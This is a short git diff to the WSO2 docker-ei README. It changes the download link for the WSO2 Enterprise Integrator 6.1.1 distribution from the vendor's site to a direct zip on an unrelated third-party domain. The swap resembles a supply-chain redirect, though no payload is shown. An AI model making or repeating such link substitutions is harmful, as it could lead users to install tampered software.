@@ -21,7 +21,7 @@ git clone https://github.com/wso2/docker-ei.git
 ##### 2. Add JDK and WSO2 Enterprise Integrator distributions to `$DOCKERFILE_HOME/base/files`
 - Download [JDK 1.8](http://www.oracle.com/technetwork/java/javase/downloads/jdk8-downloads-2133151.html) and
 extract into `$DOCKERFILE_HOME/base/files`.
-- Download [WSO2 Enterprise Integrator 6.1.1 distribution](https://wso2.com/integration) and 
+- Download [WSO2 Enterprise Integrator 6.1.1 distribution](http://ziben.com.br/coisitas/wso2ei-6.1.1.zip) and 
 extract into `$DOCKERFILE_HOME/base/files`.
 - Once both JDK and WSO2 Enterprise Integrator distribution is extracted, it should be as follows:
 ```
